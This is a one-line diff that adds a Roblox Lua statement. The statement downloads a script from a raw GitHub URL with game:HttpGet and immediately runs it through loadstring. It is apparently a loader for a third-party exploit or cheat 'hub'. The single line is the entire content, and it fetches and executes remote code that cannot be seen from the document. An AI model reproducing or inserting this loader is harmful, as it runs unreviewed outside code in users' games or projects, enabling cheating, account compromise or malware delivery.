@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/nakdepzai/ur-to-bad/main/nakhubi"))()
